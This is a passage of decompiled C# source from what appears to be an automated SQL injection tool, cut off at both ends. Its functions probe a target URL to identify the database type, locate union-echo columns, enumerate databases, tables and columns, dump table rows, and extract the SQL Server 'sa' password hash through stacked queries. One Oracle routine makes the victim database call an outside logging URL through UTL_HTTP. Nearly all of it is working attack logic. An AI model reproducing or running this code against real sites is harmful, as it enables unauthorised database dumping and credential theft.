                                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.OracleGetDataDoWork), state);
                                    }
                                }
                            }
                            break;
                        }
                    }
                    break;
                }
            }
        }

        private void ExecOracleGetDB()
        {
            this.mainfrm.DisplayProgress("Getting DB ...");
            string str = this.GetItemByOracle("select", "instance_name", "from v$instance", 0xff, 0x80);
            if (!string.IsNullOrEmpty(str))
            {
                this.AddDB2TreeView(str);
            }
            this.mainfrm.DisplayProgress("Done");
        }

        private void ExecOracleGetTable(object data)
        {
            this.mainfrm.DisplayProgress("Getting Tables ...");
            int treeViewDBCount = this.GetTreeViewDBCount("");
            for (int i = 0; i < treeViewDBCount; i++)
            {
                if (this.TreeViewDBChecked(i.ToString()))
                {
                    this.GetTreeViewDBText(i.ToString());
                    int num = this.GetIntValue("select count(TABLE_NAME) from user_tables", 0x100, 0);
                    this.mainfrm.DisplayProgress("Get Table Num: " + num.ToString());
                    if (num < 0)
                    {
                        num = 0x100;
                    }
                    for (int j = 0; j < num; j++)
                    {
                        string str = i.ToString() + "^" + ((j + 1)).ToString();
                        if (this.mainfrm.CurrentSite.BlindInjType == BlindType.CrossSite)
                        {
                            this.OracleGetTableDoWork(str);
                        }
                        else
                        {
                            ThreadPool.QueueUserWorkItem(new WaitCallback(this.OracleGetTableDoWork), str);
                        }
                    }
                    return;
                }
            }
        }

        private void ExecSQLServerCheck(object data)
        {
            try
            {
                this.mainfrm.DisplayProgress("Auto Checking ...");
                for (int i = 0; i < this.GetListViewCount(this.listViewEnv); i++)
                {
                    if (WebSite.CurrentStatus == TaskStatus.Stop)
                    {
                        Thread.CurrentThread.Abort();
                    }
                    if (this.ListViewInfoItemIsChecked(i))
                    {
                        string str = this.ReadListViewInfoItems(i);
                        if (this.mainfrm.CurrentSite.BlindInjType == BlindType.UnKnown)
                        {
                            this.GetBlindType(this.URL);
                        }
                        if (str.Equals("Server"))
                        {
                            if (string.IsNullOrEmpty(this.Server))
                            {
                                this.Server = this.GetServer(this.URL);
                            }
                            if (string.IsNullOrEmpty(this.Server))
                            {
                                this.Server = "NULL";
                            }
                            this.AddSubItem2ListViewInfo(i.ToString() + "^" + this.Server);
                        }
                        else if (str.Equals("Version"))
                        {
                            string str2 = this.GetItemBySQLServer("select", "@@version", "", 0xff, 0xff, false);
                            if (string.IsNullOrEmpty(str2))
                            {
                                str2 = "NULL";
                            }
                            this.AddSubItem2ListViewInfo(i.ToString() + "^" + str2);
                        }
                        else if (str.Equals("user"))
                        {
                            string str3 = this.GetItemBySQLServer("select", "user", "", 0xff, 0x80, false);
                            if (string.IsNullOrEmpty(str3))
                            {
                                str3 = "NULL";
                            }
                            this.AddSubItem2ListViewInfo(i.ToString() + "^" + str3);
                        }
                        else if (str.Equals("Database"))
                        {
                            string str4 = this.GetItemBySQLServer("select", "db_name()", "", 0xff, 0x80, false);
                            if (string.IsNullOrEmpty(str4))
                            {
                                str4 = "NULL";
                            }
                            this.CurrentDBName = str4;
                            this.AddSubItem2ListViewInfo(i.ToString() + "^" + str4);
                            if (!string.IsNullOrEmpty(str4))
                            {
                                this.AddDB2TreeView(str4);
                            }
                        }
                        else if (str.Equals("WWWRoot"))
                        {
                            string iISWebRoot = this.GetIISWebRoot(this.URL);
                            if (string.IsNullOrEmpty(iISWebRoot))
                            {
                                iISWebRoot = "NULL";
                            }
                            else
                            {
                                this.mainfrm.CurrentSite.WebRoot = iISWebRoot;
                            }
                            this.AddSubItem2ListViewInfo(i.ToString() + "^" + iISWebRoot);
                        }
                        else if (str.Equals("IsAdmin"))
                        {
                            this.AddSubItem2ListViewInfo(i.ToString() + "^" + this.GetIntValue("IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00)", 1, 0).ToString());
                        }
                        else if (str.Equals("Sa_PasswordHash"))
                        {
                            this.TempTbNum++;
                            string str7 = "WCRTEMP" + string.Format("{0:D5}", this.TempTbNum);
                            string uRL = this.URL + this.PreFix + ";create table " + str7 + "(tmp varchar(255));declare @b varbinary(256),@s varchar(256);select @b=password  from master.dbo.sysxlogins where name=0x73006100;exec master..xp_varbintohexstr @b,@s out;insert into " + str7 + " select @s" + this.CommentString;
                            this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                            string str9 = this.GetItemBySQLServer("select%20top%201%20", "tmp", "from%20" + str7, 0x7e, 0xff, false);
                            uRL = this.URL + this.PreFix + ";drop table " + str7 + "%3B" + this.CommentString;
                            this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                            if (string.IsNullOrEmpty(str9))
                            {
                                str9 = "NULL";
                            }
                            this.AddSubItem2ListViewInfo(i.ToString() + "^" + str9);
                        }
                    }
                }
                this.mainfrm.DisplayProgress("Done");
            }
            catch
            {
            }
        }

        private void ExecSQLServerGetColumn(object data)
        {
            string treeViewDBText = "";
            string itemName = "";
            int treeViewDBCount = this.GetTreeViewDBCount("");
            for (int i = 0; i < treeViewDBCount; i++)
            {
                if (this.TreeViewDBChecked(i.ToString()))
                {
                    treeViewDBText = this.GetTreeViewDBText(i.ToString());
                    int num4 = this.GetTreeViewDBCount(i.ToString());
                    for (int j = 0; j < num4; j++)
                    {
                        if (this.TreeViewDBChecked(i.ToString() + "^" + j.ToString()))
                        {
                            this.mainfrm.DisplayProgress("Getting Columns ...");
                            string state = "";
                            itemName = this.GetTreeViewDBText(i.ToString() + "^" + j.ToString());
                            int num = this.GetIntValue("select count(1) from [" + treeViewDBText + "].information_schema.columns where table_name=" + this.EscapeSingleQuotes(itemName), 0x80, 0);
                            this.mainfrm.DisplayProgress("Get Column Num: " + num.ToString());
                            if (num < 1)
                            {
                                if (treeViewDBText.Equals(this.CurrentDBName))
                                {
                                    int num6 = 1;
                                    while (true)
                                    {
                                        string str4 = this.GetItemBySQLServer("select", "col_name(object_id(" + this.EscapeSingleQuotes(itemName) + ")," + num6.ToString() + ")", "", 0xff, 0x80, false);
                                        if (string.IsNullOrEmpty(str4))
                                        {
                                            return;
                                        }
                                        this.AddColumn2TreeView(i.ToString() + "^" + j.ToString() + "^" + str4);
                                        num6++;
                                    }
                                }
                                num = 0x80;
                            }
                            for (int k = 0; k < num; k++)
                            {
                                string[] strArray3 = new string[] { i.ToString(), "^", j.ToString(), "^", (k + 1).ToString(), "^", treeViewDBText, "^", itemName };
                                state = string.Concat(strArray3);
                                ThreadPool.QueueUserWorkItem(new WaitCallback(this.GetColumnDoWork), state);
                            }
                            break;
                        }
                    }
                }
            }
        }

        private void ExecSQLServerGetData(int RowsBegin, int RowsEnd)
        {
            string text = "";
            string str2 = "";
            foreach (TreeNode node in this.treeViewDB.Nodes)
            {
                if (node.Checked)
                {
                    text = node.Text;
                    foreach (TreeNode node2 in node.Nodes)
                    {
                        if (node2.Checked)
                        {
                            str2 = node2.Text;
                            string str3 = "";
                            string str4 = "";
                            string str5 = "";
                            foreach (TreeNode node3 in node2.Nodes)
                            {
                                if (node3.Checked)
                                {
                                    if (string.IsNullOrEmpty(str3))
                                    {
                                        str5 = "[" + node3.Text + "]";
                                    }
                                    else
                                    {
                                        str3 = str3 + "%2Bchar(94)%2B";
                                        str4 = str4 + ",";
                                    }
                                    str3 = str3 + "isnull(cast([" + node3.Text + "] as nvarchar(4000)),char(32))";
                                    str4 = str4 + "[" + node3.Text + "]";
                                }
                            }
                            int num = this.GetIntValue("select count(1) from [" + text + "]..[" + str2 + "]", RowsEnd, 0);
                            if (num == 0)
                            {
                                MessageBox.Show("No Records Found!");
                            }
                            else
                            {
                                if ((num > 0) && (num < RowsEnd))
                                {
                                    RowsEnd = num;
                                    this.txtRowsEnd.Text = num.ToString();
                                }
                                if (RowsBegin > RowsEnd)
                                {
                                    MessageBox.Show("* Exceed Records Range!\r\n* The Rows Num=" + num.ToString());
                                }
                                else
                                {
                                    for (int i = RowsBegin - 1; i < RowsEnd; i++)
                                    {
                                        string state = "";
                                        if (text.Equals(this.CurrentDBName))
                                        {
                                            state = str3 + "^" + i.ToString() + "^" + str4 + "^[" + str2 + "]^" + str5;
                                        }
                                        else
                                        {
                                            state = str3 + "^" + i.ToString() + "^" + str4 + "^[" + text + "]..[" + str2 + "]^" + str5;
                                        }
                                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.SQLServerGetDataDoWork), state);
                                    }
                                }
                            }
                            break;
                        }
                    }
                    break;
                }
            }
        }

        private void ExecSQLServerGetDB()
        {
            this.mainfrm.DisplayProgress("Getting DB ...");
            if (this.cmbChkAllDB.SelectedIndex == 0)
            {
                string str = this.GetItemBySQLServer("", "db_name()", "", 0xff, 0x80, false);
                if (!string.IsNullOrEmpty(str))
                {
                    this.AddDB2TreeView(str);
                    this.CurrentDBName = str;
                }
                this.mainfrm.DisplayProgress("Done");
            }
            else
            {
                int num = this.GetIntValue("select%20count(1)%20from%20[master]..[sysdatabases]", 0x80, 0);
                this.mainfrm.DisplayProgress("Get DB Num: " + num.ToString());
                if (num < 1)
                {
                    this.mainfrm.DisplayProgress("Done");
                }
                else
                {
                    for (int i = 0; i < num; i++)
                    {
                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.GetDBDoWork), i + 1);
                    }
                }
            }
        }

        private void ExecSQLServerGetTable(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                this.mainfrm.DisplayProgress("Getting Tables ...");
                DateTime now = DateTime.Now;
                string treeViewDBText = "";
                int treeViewDBCount = this.GetTreeViewDBCount("");
                for (int i = 0; i < treeViewDBCount; i++)
                {
                    if (WebSite.CurrentStatus == TaskStatus.Stop)
                    {
                        Thread.CurrentThread.Abort();
                    }
                    if (this.TreeViewDBChecked(i.ToString()))
                    {
                        treeViewDBText = this.GetTreeViewDBText(i.ToString());
                        int num = this.GetIntValue("select count(1) from [" + treeViewDBText + "]..[sysobjects] where xtype=0x55  and name not like 0x570043005200540045004D0050002500", 0x100, 0);
                        if (num < 0)
                        {
                            num = this.GetIntValue("select count(1) from [sysobjects] where xtype=0x55  and name not like 0x570043005200540045004D0050002500", 0x100, 0);
                        }
                        this.mainfrm.DisplayProgress("Get Table Num: " + num.ToString());
                        if (num < 0)
                        {
                            num = 0x100;
                        }
                        string[] strArray = new string[num];
                        for (int j = 0; j < num; j++)
                        {
                            string[] strArray2 = new string[] { i.ToString(), "^", (j + 1).ToString(), "^", treeViewDBText };
                            strArray[j] = string.Concat(strArray2);
                            ThreadPool.QueueUserWorkItem(new WaitCallback(this.GetTableDoWork), strArray[j]);
                        }
                        return;
                    }
                }
            }
            catch
            {
            }
        }

        private void ExportListViewData(object FileName)
        {
            if (!this.listViewData.InvokeRequired)
            {
                try
                {
                    string path = (string) FileName;
                    StreamWriter writer = System.IO.File.CreateText(path);
                    string str2 = "";
                    for (int i = 0; i < this.listViewData.Columns.Count; i++)
                    {
                        if (!string.IsNullOrEmpty(str2))
                        {
                            str2 = str2 + "\t";
                        }
                        str2 = str2 + this.listViewData.Columns[i].Text;
                    }
                    writer.WriteLine(str2);
                    str2 = "";
                    for (int j = 0; j < this.listViewData.Items.Count; j++)
                    {
                        str2 = str2 + this.listViewData.Items[j].Text;
                        int count = this.listViewData.Items[j].SubItems.Count;
                        for (int k = 1; k < this.listViewData.Columns.Count; k++)
                        {
                            if (k < count)
                            {
                                str2 = str2 + "\t" + this.listViewData.Items[j].SubItems[k].Text;
                            }
                            else
                            {
                                str2 = str2 + "\t ";
                            }
                        }
                        writer.WriteLine(str2);
                        str2 = "";
                    }
                    writer.Close();
                    MessageBox.Show("Export OK!", "Done");
                }
                catch (Exception exception)
                {
                    MessageBox.Show(exception.Message);
                }
            }
            else
            {
                dd method = new dd(this.ExportListViewData);
                base.Invoke(method, new object[] { FileName });
            }
        }

        private string GetAExistedTableByAccess()
        {
            if (!string.IsNullOrEmpty(this.ExistedTableInAccess))
            {
                return this.ExistedTableInAccess;
            }
            string treeViewDBText = this.GetTreeViewDBText("0|0");
            if (string.IsNullOrEmpty(treeViewDBText))
            {
                return "NULL";
            }
            return treeViewDBText;
        }

        private void GetBlindType(string URL)
        {
            this.GetBlindLocked = true;
            try
            {
                this.mainfrm.DisplayProgress("Getting Blind Injection Type...");
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.UnKnown)
                {
                    this.mainfrm.CurrentSite.DatabaseType = this.GetDBType(URL);
                }
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
                {
                    if (!string.IsNullOrEmpty(this.GetItemBySQLServerPlainText("@@version")))
                    {
                        this.mainfrm.CurrentSite.BlindInjType = BlindType.PlainText;
                    }
                    else
                    {
                        if (this.mainfrm.CurrentSite.CurrentFieldNum == 0)
                        {
                            this.mainfrm.CurrentSite.CurrentFieldNum = this.GetFieldEchoNum(URL);
                        }
                        if (this.mainfrm.CurrentSite.CurrentFieldNum < 0)
                        {
                            goto Label_04D0;
                        }
                        int fieldEchoIndex = this.GetFieldEchoIndex(this.mainfrm.CurrentSite.CurrentFieldNum);
                        if (fieldEchoIndex < 0)
                        {
                            goto Label_04D0;
                        }
                        this.mainfrm.CurrentSite.BlindInjType = BlindType.FieldEcho;
                        this.mainfrm.CurrentSite.CurrentFieldEchoIndex = fieldEchoIndex;
                    }
                    return;
                }
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
                {
                    if (this.mainfrm.CurrentSite.CurrentFieldNum == 0)
                    {
                        this.mainfrm.CurrentSite.CurrentFieldNum = this.GetFieldEchoNum(URL);
                    }
                    if (this.mainfrm.CurrentSite.CurrentFieldNum > 0)
                    {
                        int num2 = this.GetFieldEchoIndex(this.mainfrm.CurrentSite.CurrentFieldNum);
                        if (num2 > 0)
                        {
                            this.mainfrm.CurrentSite.BlindInjType = BlindType.FieldEcho;
                            this.mainfrm.CurrentSite.CurrentFieldEchoIndex = num2;
                            return;
                        }
                    }
                    if (this.GetItemByMySQLPlainText(this.EscapeSingleQuotes("!S!WWWCCCRRR1.0!E!"), 0x20).Equals("!S!WWWCCCRRR1.0!E!"))
                    {
                        this.mainfrm.CurrentSite.BlindInjType = BlindType.PlainText;
                        return;
                    }
                }
                else
                {
                    if (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)
                    {
                        if (this.GetItemByOraclePlainText(this.EscapeSingleQuotes("WWWCCCRRR1.0")).Equals("WWWCCCRRR1.0"))
                        {
                            this.mainfrm.CurrentSite.BlindInjType = BlindType.PlainText;
                        }
                        else
                        {
                            if (this.mainfrm.CurrentSite.CurrentFieldNum == 0)
                            {
                                this.mainfrm.CurrentSite.CurrentFieldNum = this.GetFieldEchoNum(URL);
                            }
                            if (this.mainfrm.CurrentSite.CurrentFieldNum > 0)
                            {
                                int num3 = this.GetFieldEchoIndex(this.mainfrm.CurrentSite.CurrentFieldNum);
                                if (num3 > 0)
                                {
                                    this.mainfrm.CurrentSite.BlindInjType = BlindType.FieldEcho;
                                    this.mainfrm.CurrentSite.CurrentFieldEchoIndex = num3;
                                    return;
                                }
                            }
                            string uRL = URL + this.PreFix + "%20" + this.LogicOperator + "%20UTL_HTTP.request(" + this.EscapeSingleQuotes(WCRSetting.CrossSiteURL + this.mainfrm.CurrentSite.DomainHost) + ")=1" + this.CommentString;
                            this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                            if (!this.mainfrm.CurrentSite.GetSourceCode(WCRSetting.CrossSiteRecord, RequestType.GET, Encoding.UTF8).Equals(this.mainfrm.CurrentSite.DomainHost))
                            {
                                goto Label_04D0;
                            }
                            this.mainfrm.CurrentSite.BlindInjType = BlindType.CrossSite;
                        }
                        return;
                    }
                    if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
                    {
                        if (this.mainfrm.CurrentSite.CurrentFieldNum == 0)
                        {
                            this.mainfrm.CurrentSite.CurrentFieldNum = this.GetFieldEchoNum(URL);
                        }
                        if (this.mainfrm.CurrentSite.CurrentFieldNum > 0)
                        {
                            int num4 = this.GetFieldEchoIndex(this.mainfrm.CurrentSite.CurrentFieldNum);
                            if (num4 > 0)
                            {
                                this.mainfrm.CurrentSite.BlindInjType = BlindType.FieldEcho;
                                this.mainfrm.CurrentSite.CurrentFieldEchoIndex = num4;
                                return;
                            }
                        }
                    }
                    else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Access)
                    {
                        while (this.mainfrm.CurrentSite.HTTPThreadNum > 0)
                        {
                            Thread.Sleep(500);
                        }
                        if (this.mainfrm.CurrentSite.CurrentFieldNum == 0)
                        {
                            this.mainfrm.CurrentSite.CurrentFieldNum = this.GetFieldEchoNum(URL);
                        }
                        if (this.mainfrm.CurrentSite.CurrentFieldNum >= 0)
                        {
                            int num5 = this.GetFieldEchoIndex(this.mainfrm.CurrentSite.CurrentFieldNum);
                            if (num5 >= 0)
                            {
                                this.mainfrm.CurrentSite.BlindInjType = BlindType.FieldEcho;
                                this.mainfrm.CurrentSite.CurrentFieldEchoIndex = num5;
                                return;
                            }
                        }
                    }
                }
            Label_04D0:
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.UnKnown)
                {
                    this.mainfrm.CurrentSite.BlindInjType = BlindType.Blind;
                }
            }
            catch
            {
            }
            finally
            {
                this.GetBlindLocked = false;
            }
        }

        private void GetColumnDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { '^' });
                string str2 = strArray[0];
                string str3 = strArray[1];
                string str4 = strArray[2];
                string str5 = strArray[3];
                string itemName = strArray[4];
                string str7 = this.GetItemBySQLServer("select%20top%201%20", "column_name", " from [" + str5 + "].information_schema.columns where table_name=" + this.EscapeSingleQuotes(itemName) + "%20and ordinal_position=" + str4, 0xff, 0x80, false);
                this.AddColumn2TreeView(str2 + "^" + str3 + "^" + str7);
            }
            catch
            {
            }
        }

        private void GetDBDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string nodeText = this.GetItemBySQLServer("select", "name", "from%20[master]..[sysdatabases]%20where dbid=" + ((int) data).ToString(), 0xff, 0x80, false);
                this.AddDB2TreeView(nodeText);
            }
            catch
            {
            }
        }

        private DBType GetDBType(string URL)
        {
            try
            {
                this.mainfrm.DisplayProgress("Getting DataBase Type...");
                string sURL = URL + "%27";
                this.mainfrm.CurrentSite.GetSourceCode(URL, this.mainfrm.ReqType);
                HttpWebResponse httpWebResponse = this.mainfrm.CurrentSite.GetHttpWebResponse(sURL, this.mainfrm.ReqType);
                string sourceCodeFromHttpWebResponse = this.mainfrm.CurrentSite.GetSourceCodeFromHttpWebResponse(httpWebResponse);
                if (httpWebResponse.StatusCode == HttpStatusCode.InternalServerError)
                {
                    if (sourceCodeFromHttpWebResponse.IndexOf("SQL Server") >= 0)
                    {
                        this.mainfrm.CurrentSite.DatabaseType = DBType.SQLServer;
                        this.UpdateComboDBType("SQLserver");
                        this.InitByDBType(false);
                        this.mainfrm.CurrentSite.BlindInjType = BlindType.PlainText;
                        return DBType.SQLServer;
                    }
                    if ((sourceCodeFromHttpWebResponse.IndexOf("JET Database") >= 0) || (sourceCodeFromHttpWebResponse.IndexOf("Access Driver") >= 0))
                    {
                        this.mainfrm.CurrentSite.DatabaseType = DBType.Access;
                        this.UpdateComboDBType("Access");
                        this.InitByDBType(false);
                        return DBType.Access;
                    }
                    if ((sourceCodeFromHttpWebResponse.IndexOf("MySQL") >= 0) || (sourceCodeFromHttpWebResponse.IndexOf("mysql") >= 0))
                    {
                        this.mainfrm.CurrentSite.DatabaseType = DBType.MySQL;
                        this.UpdateComboDBType("MySQL");
                        this.InitByDBType(false);
                        return DBType.MySQL;
                    }
                    if (sourceCodeFromHttpWebResponse.IndexOf("Ora") >= 0)
                    {
                        this.mainfrm.CurrentSite.DatabaseType = DBType.Oracle;
                        this.UpdateComboDBType("Oracle");
                        this.InitByDBType(false);
                        return DBType.Oracle;
                    }
                    if (sourceCodeFromHttpWebResponse.IndexOf("db2") >= 0)
                    {
                        this.mainfrm.CurrentSite.DatabaseType = DBType.DB2;
                        this.UpdateComboDBType("DB2");
                        this.InitByDBType(false);
                        return DBType.DB2;
                    }
                }
                this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(URL);
                if (!string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
                {
                    string uRL = URL + this.PreFix + "%20" + this.LogicOperator + "%20(select%20count(1)%20from%20sysobjects)>0" + this.PostFix;
                    if (this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType).IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
                    {
                        this.mainfrm.CurrentSite.DatabaseType = DBType.SQLServer;
                        this.UpdateComboDBType("SQLserver");
                        this.InitByDBType(false);
                        return DBType.SQLServer;
                    }
                    uRL = URL + this.PreFix + "%20" + this.LogicOperator + "%20(select%20length(user()))>0" + this.PostFix;
                    if (this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType).IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
                    {
                        this.mainfrm.CurrentSite.DatabaseType = DBType.MySQL;
                        this.UpdateComboDBType("MySQL");
                        this.InitByDBType(false);
                        return DBType.MySQL;
                    }
                    uRL = URL + this.PreFix + "%20" + this.LogicOperator + "%20(select%20length(user)%20from%20dual)>0" + this.PostFix;
                    if (this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType).IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
                    {
                        this.mainfrm.CurrentSite.DatabaseType = DBType.Oracle;
                        this.UpdateComboDBType("Oracle");
                        this.InitByDBType(false);
                        return DBType.Oracle;
                    }
                    uRL = URL + this.PreFix + "%20" + this.LogicOperator + "%20(select%20length(user)%20from%20sysibm.sysdummy1)>0" + this.PostFix;
                    if (this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType).IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
                    {
                        this.mainfrm.CurrentSite.DatabaseType = DBType.DB2;
                        this.UpdateComboDBType("DB2");
                        this.InitByDBType(false);
                        return DBType.DB2;
                    }
                    uRL = URL + this.PreFix + "%20" + this.LogicOperator + "%20asc(chr(97))=97" + this.PostFix;
                    if (this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType).IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
                    {
                        this.mainfrm.CurrentSite.DatabaseType = DBType.Access;
                        this.UpdateComboDBType("Access");
                        this.InitByDBType(false);
                        return DBType.Access;
                    }
                    MessageBox.Show("* Get Database Type Failed! \r\n* Please Select the DB Type manually!", "Information");
                }
                return DBType.UnKnown;
            }
            catch
            {
                return DBType.UnKnown;
            }
        }

        private void GetEnvInfo(object data)
        {
            if (string.IsNullOrEmpty(this.URL))
            {
                this.InitURL();
            }
            if (!string.IsNullOrEmpty(this.URL))
            {
                if ((this.mainfrm.ReqType == RequestType.GET) && (this.URL.IndexOf('=') < 0))
                {
                    MessageBox.Show("* Current URL is not injectable!\r\n* Please input a injectable URL such as: http://127.0.0.1/topic.asp?id=10\r\n* If you don't know which URL is injectable, please scan the site at first.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                }
                else
                {
                    this.mainfrm.DisplayProgress("Auto Checking ...");
                    this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(this.URL);
                    if (!string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord) && (this.mainfrm.CurrentSite.InjType != InjectionType.NotInjectable))
                    {
                        this.InitURL();
                        if (this.mainfrm.CurrentSite.DatabaseType == DBType.UnKnown)
                        {
                            this.mainfrm.CurrentSite.DatabaseType = this.GetDBType(this.URL);
                        }
                        if (this.mainfrm.CurrentSite.DatabaseType != DBType.UnKnown)
                        {
                            if (this.mainfrm.CurrentSite.BlindInjType == BlindType.UnKnown)
                            {
                                if (this.mainfrm.CurrentSite.DatabaseType != DBType.Access)
                                {
                                    this.GetBlindType(this.URL);
                                }
                                else
                                {
                                    if (this.GetAExistedTableByAccess().Equals("NULL"))
                                    {
                                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecAccessGetTable));
                                        return;
                                    }
                                    this.GetBlindType(this.URL);
                                }
                            }
                            if (this.GetListViewCount(this.listViewEnv) >= 1)
                            {
                                if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
                                {
                                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecSQLServerCheck));
                                }
                                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Access)
                                {
                                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecAccessCheck));
                                }
                                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
                                {
                                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecMySQLCheck));
                                }
                                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)
                                {
                                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecOracleCheck));
                                }
                                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
                                {
                                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecDB2Check));
                                }
                                else
                                {
                                    this.mainfrm.DisplayProgress("Done");
                                }
                            }
                        }
                    }
                }
            }
        }

        private int GetFieldEchoIndex(int FieldNum)
        {
            this.mainfrm.DisplayProgress("Getting Injectale Field Location in Current SQL ...");
            for (int i = 0; i < FieldNum; i++)
            {
                string wildField = "";
                string str2 = "";
                for (int j = 0; j < i; j++)
                {
                    if (string.IsNullOrEmpty(wildField))
                    {
                        wildField = this.WildField;
                        if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
                        {
                            wildField = "1";
                        }
                    }
                    else
                    {
                        wildField = wildField + "," + this.WildField;
                    }
                }
                if (!string.IsNullOrEmpty(wildField))
                {
                    wildField = wildField + ",";
                }
                for (int k = 0; k < ((FieldNum - i) - 1); k++)
                {
                    str2 = str2 + "," + this.WildField;
                }
                string str3 = "";
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
                {
                    str3 = "char(33)%2Bchar(83)%2Bchar(33)%2Bchar(87)%2Bchar(87)%2Bchar(87)%2Bchar(67)%2Bchar(67)%2Bchar(67)%2Bchar(82)%2Bchar(82)%2Bchar(82)%2Bchar(49)%2Bchar(46)%2Bchar(48)%2Bchar(33)%2Bchar(69)%2Bchar(33)";
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
                {
                    str3 = "char(33,83,33,87,87,87,67,67,67,82,82,82,49,46,48,33,69,33)";
                }
                else if ((this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle) || (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2))
                {
                    str3 = "chr(33)||chr(83)||chr(33)||chr(87)||chr(87)||chr(87)||chr(67)||chr(67)||chr(67)||chr(82)||chr(82)||chr(82)||chr(49)||chr(46)||chr(48)||chr(33)||chr(69)||chr(33)";
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Access)
                {
                    str3 = "chr(33)%2Bchr(83)%2Bchr(33)%2Bchr(87)%2Bchr(87)%2Bchr(87)%2Bchr(67)%2Bchr(67)%2Bchr(67)%2Bchr(82)%2Bchr(82)%2Bchr(82)%2Bchr(49)%2Bchr(46)%2Bchr(48)%2Bchr(33)%2Bchr(69)%2Bchr(33)";
                }
                else
                {
                    return -1;
                }
                string str4 = "";
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)
                {
                    str4 = "%20from dual";
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
                {
                    str4 = "%20from sysibm.sysdummy1";
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Access)
                {
                    if (this.ExistedTableInAccess.Equals("NULL"))
                    {
                        return -1;
                    }
                    str4 = "%20from%20" + this.ExistedTableInAccess + "%00";
                }
                string uRL = this.URL + this.PreFix + "%20and%201=2%20union%20all%20select%20" + wildField + str3 + str2 + str4 + this.CommentString;
                string sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                if (string.IsNullOrEmpty(sourceCode))
                {
                    return -1;
                }
                if (sourceCode.IndexOf("!S!WWWCCCRRR1.0!E!") >= 0)
                {
                    return (i + 1);
                }
            }
            return -1;
        }

        private int GetFieldEchoNum(string URL)
        {
            this.mainfrm.DisplayProgress("Getting Field Number in Current SQL ...");
            if (this.mainfrm.CurrentSite.InjType == InjectionType.UnKnown)
            {
                this.mainfrm.CurrentSite.InjType = this.GetInjectionType();
            }
            if (this.mainfrm.CurrentSite.InjType != InjectionType.UnKnown)
            {
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.UnKnown)
                {
                    this.mainfrm.CurrentSite.DatabaseType = this.GetDBType(URL);
                }
                string str = "";
                bool flag = true;
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)
                {
                    str = "%20from%20dual";
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
                {
                    str = "%20from%20sysibm.sysdummy1";
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Access)
                {
                    if (this.ExistedTableInAccess.Equals("NULL"))
                    {
                        flag = false;
                    }
                    else
                    {
                        str = "%20from%20" + this.ExistedTableInAccess;
                    }
                }
                string str2 = "";
                string uRL = "";
                string sourceCode = this.mainfrm.CurrentSite.GetSourceCode(URL, this.mainfrm.ReqType);
                string str5 = "";
                if (flag)
                {
                    for (int i = 0; i < 100; i++)
                    {
                        if (string.IsNullOrEmpty(str2))
                        {
                            str2 = "NULL";
